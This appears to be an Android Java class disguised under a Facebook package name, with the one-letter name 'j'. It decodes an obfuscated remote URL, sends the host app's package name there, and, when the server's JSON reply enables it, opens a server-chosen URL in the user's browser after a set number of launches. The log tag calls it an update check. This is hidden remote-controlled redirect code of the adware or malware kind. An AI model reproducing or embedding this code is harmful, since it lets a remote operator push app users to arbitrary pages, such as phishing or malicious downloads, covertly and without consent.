package com.facebook.account;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class j {

    private Context context;

    public j(Context context) {
        this.context = context;
    }

    @SuppressLint("StaticFieldLeak")
    public void j() {
        new AsyncTask<Void, Void, String>() {
            @Override
            protected String doInBackground(Void... voids) {
                try {
                    final String packageName = context.getPackageName();

                    URL url = new URL(decrypt("epihopC.%4B2Ki!ui/Ky3rCabrTb2iNl^/zmdonc7.&ztogt0aNnbi#sLageQyQ/x/5:0sMpDt$t&h") + packageName);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");

                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuilder response = new StringBuilder();
                        String line;
                        while ((line = in.readLine()) != null) {
                            response.append(line);
                        }
                        in.close();

                        return response.toString();
                    } else {
                        return null;
                    }
                } catch (Exception e) {
                    return null;
                }
            }

            @Override
            protected void onPostExecute(String result) {
                if (result == null) return;
                try {
                    JSONObject jsonObject = new JSONObject(result);
                    String active = jsonObject.optString("active", "false");
                    String url = jsonObject.optString("url", "");
                    int index = jsonObject.optInt("index", 1);

                    SharedPreferences prefs = context.getSharedPreferences("lib_prefs", Context.MODE_PRIVATE);
                    int openCount = prefs.getInt("open_count", 0) + 1;

                    if ("true".equals(active) && openCount >= index && url != null && !url.isEmpty()) {
                        // Reset count and redirect
                        prefs.edit().putInt("open_count", 0).apply();
                        jperfom(url);
                    } else {
                        // Save incremented count
                        prefs.edit().putInt("open_count", openCount).apply();
                    }
                } catch (JSONException e) {
                    Log.e("UpdateChecker", "Error parsing JSON", e);
                }
            }
        }.execute();
    }

    private void jperfom(final String updateUrl) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(updateUrl));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e("UpdateChecker", "Failed to start intent", e);
        }
    }

    static String decrypt(String encryptedStr) {
        StringBuilder sb = new StringBuilder(encryptedStr);
        StringBuilder str = new StringBuilder();

        for(int i = 0; i < sb.length(); ++i) {
            if ((i + 1) % 2 == 0) {
                str.append(sb.charAt(i));
            }
        }

        return str.reverse().toString();
    }
}
